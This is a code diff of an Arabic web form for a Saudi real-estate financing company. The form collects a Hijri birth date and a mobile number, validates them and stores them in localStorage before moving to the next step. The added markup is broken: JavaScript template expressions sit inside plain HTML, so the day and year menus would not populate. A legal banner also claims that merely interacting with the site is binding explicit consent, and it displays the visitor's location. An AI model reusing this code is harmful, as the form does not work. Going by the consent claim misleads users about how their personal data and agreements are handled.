@@ -2,31 +2,72 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>إدخال رقم الجوال وتاريخ الميلاد</title>
+  <title>بيانات إضافية</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       font-family: 'Tajawal', sans-serif;
-      background-color: #e8f5e9;
+      background-color: #e3f2fd;
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding-top: 50px;
+      padding-top: 20px;
       min-height: 100vh;
+      margin: 0;
     }
-    h2 {
-      color: #1b5e20;
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #004d40;
+      padding: 15px 10px;
+      border-bottom: 4px solid #00796b;
+      width: 100%;
     }
-    input, select {
+
+    .header img {
+      height: 50px;
+      margin-left: 15px;
+    }
+
+    .header span {
+      font-size: 22px;
+      font-weight: bold;
+      color: white;
+    }
+
+    h1 {
+      font-size: 22px;
+      color: #00796b;
+      margin: 25px 0 10px;
+      text-align: center;
+    }
+
+    .form-box {
+      background: #fff;
+      padding: 30px;
+      border-radius: 16px;
+      border: 2px solid #01579b;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 450px;
+      text-align: center;
+    }
+
+    select, input {
       padding: 10px;
       margin: 10px 0;
-      width: 300px;
-      border: 2px solid #1b5e20;
-      border-radius: 10px;
+      width: 90%;
+      border-radius: 8px;
+      border: 1px solid #ccc;
       font-size: 16px;
+      text-align: center;
     }
+
     button {
       padding: 10px 30px;
-      background-color: #1b5e20;
+      background-color: #01579b;
       color: white;
       border: none;
       border-radius: 10px;
@@ -34,96 +75,121 @@
       margin-top: 20px;
       cursor: pointer;
     }
+
     button:hover {
-      background-color: #2e7d32;
+      background-color: #0277bd;
+    }
+
+    .error {
+      color: red;
+      font-size: 14px;
+      margin-top: 8px;
     }
 
     .legal-box {
-      background-color: #fff3f3;
-      border: 2px solid #e53935;
+      background-color: #fff8f8;
+      border: 2px solid #d32f2f;
       border-radius: 12px;
-      padding: 16px;
-      margin: 40px auto 10px;
-      max-width: 90%;
+      padding: 18px;
+      margin: 40px auto 20px;
+      max-width: 92%;
       text-align: right;
       font-size: 15px;
-      color: #333;
+      color: #444;
     }
+
     .legal-box h3 {
       margin: 0 0 10px;
       font-size: 18px;
-      color: #004d40;
-    }
-    .legal-box .warning {
       color: #b71c1c;
-      font-weight: bold;
-      margin: 8px 0;
+    }
+
+    .legal-box p {
+      margin: 5px 0;
+      line-height: 1.7;
     }
   </style>
 </head>
 <body>
 
-  <h2>رقم الجوال وتاريخ الميلاد</h2>
-  <input type="text" id="phone" placeholder="رقم الجوال" required>
+  <div class="header">
+    <img src="logo.png" alt="شعار الشركة">
+    <span>شركة سرعة تملك العقار والحلول التمويلية المتكاملة</span>
+  </div>
 
-  <label for="day">تاريخ الميلاد (ميلادي):</label>
-  <select id="day"></select>
-  <select id="month"></select>
-  <select id="year"></select>
+  <h1>عقد إنهاء إجراءات تمويل عقاري من جهة تمويلية</h1>
 
-  <button onclick="saveAndContinue()">التالي</button>
+  <div class="form-box">
+    <h2>الرجاء إدخال تاريخ الميلاد ورقم الجوال</h2>
+    
+    <select id="day">
+      <option value="">اليوم</option>
+      ${[...Array(30)].map((_, i) => `<option value="${i+1}">${i+1}</option>`).join('')}
+    </select>
+
+    <select id="month">
+      <option value="">الشهر</option>
+      <option value="1">محرم</option>
+      <option value="2">صفر</option>
+      <option value="3">ربيع أول</option>
+      <option value="4">ربيع ثاني</option>
+      <option value="5">جمادى الأولى</option>
+      <option value="6">جمادى الآخرة</option>
+      <option value="7">رجب</option>
+      <option value="8">شعبان</option>
+      <option value="9">رمضان</option>
+      <option value="10">شوال</option>
+      <option value="11">ذو القعدة</option>
+      <option value="12">ذو الحجة</option>
+    </select>
+
+    <select id="year">
+      <option value="">السنة</option>
+      ${[...Array(70)].map((_, i) => {
+        const y = 1430 - i;
+        return `<option value="${y}">${y}</option>`;
+      }).join('')}
+    </select>
+
+    <input type="text" id="mobile" placeholder="رقم الجوال (10 أرقام يبدأ بـ05)" required>
+
+    <div id="errorMsg" class="error"></div>
+
+    <button onclick="validateAndNext()">التالي</button>
+  </div>
 
   <div class="legal-box">
-    <h3>شركة سرعة تملك العقار والحلول التمويلية المتكاملة</h3>
-    <p class="warning">
-      ⛔️ تنبيه قانوني: يخضع هذا العقد للمادة التاسعة من نظام التعاملات الإلكترونية في المملكة العربية السعودية، ويُعد التفاعل مع هذا الموقع بمثابة موافقة صريحة على كافة البنود، وله حجية نظامية كاملة في الإثبات أمام الجهات الرسمية والقضائية.
+    <h3>🚨 تنبيه قانوني</h3>
+    <p>
+      يخضع هذا العقد للمادة التاسعة من نظام التعاملات الإلكترونية في المملكة العربية السعودية،
+      ويُعد التفاعل مع هذا الموقع بمثابة موافقة صريحة على كافة البنود، وله حجية نظامية كاملة في الإثبات أمام الجهات الرسمية والقضائية.
     </p>
     <p id="location">📍 موقع الدخول: يتم تحديده...</p>
     <p id="datetime">🕒 التاريخ والوقت: جاري التحميل...</p>
   </div>
 
   <script>
-    // تعبئة القوائم
-    const daySelect = document.getElementById("day");
-    const monthSelect = document.getElementById("month");
-    const yearSelect = document.getElementById("year");
-
-    for (let i = 1; i <= 31; i++) {
-      let option = document.createElement("option");
-      option.value = i;
-      option.textContent = i;
-      daySelect.appendChild(option);
-    }
-
-    const months = ["يناير", "فبراير", "مارس", "أبريل", "مايو", "يونيو", "يوليو", "أغسطس", "سبتمبر", "أكتوبر", "نوفمبر", "ديسمبر"];
-    for (let i = 0; i < months.length; i++) {
-      let option = document.createElement("option");
-      option.value = i + 1;
-      option.textContent = months[i];
-      monthSelect.appendChild(option);
-    }
-
-    const thisYear = new Date().getFullYear();
-    for (let i = thisYear - 100; i <= thisYear; i++) {
-      let option = document.createElement("option");
-      option.value = i;
-      option.textContent = i;
-      yearSelect.appendChild(option);
-    }
-
-    function saveAndContinue() {
-      const phone = document.getElementById("phone").value.trim();
+    function validateAndNext() {
       const day = document.getElementById("day").value;
       const month = document.getElementById("month").value;
       const year = document.getElementById("year").value;
+      const mobile = document.getElementById("mobile").value.trim();
+      const error = document.getElementById("errorMsg");
 
-      if (phone && day && month && year) {
-        localStorage.setItem("clientPhone", phone);
-        localStorage.setItem("clientBirth", `${day}-${month}-${year}`);
-        window.location.href = "step4.html";
-      } else {
-        alert("يرجى تعبئة جميع الحقول.");
+      if (!day || !month || !year || !mobile) {
+        error.textContent = "يرجى تعبئة جميع الحقول بشكل صحيح.";
+        return;
       }
+
+      if (!/^05\d{8}$/.test(mobile)) {
+        error.textContent = "رقم الجوال يجب أن يكون 10 أرقام ويبدأ بـ 05.";
+        return;
+      }
+
+      const hijriDate = `${day.padStart(2, '0')}/${month.padStart(2, '0')}/${year}`;
+      localStorage.setItem("birthDateHijri", hijriDate);
+      localStorage.setItem("mobile", mobile);
+      window.location.href = "step4.html";
     }
 
     const dtBox = document.getElementById("datetime");
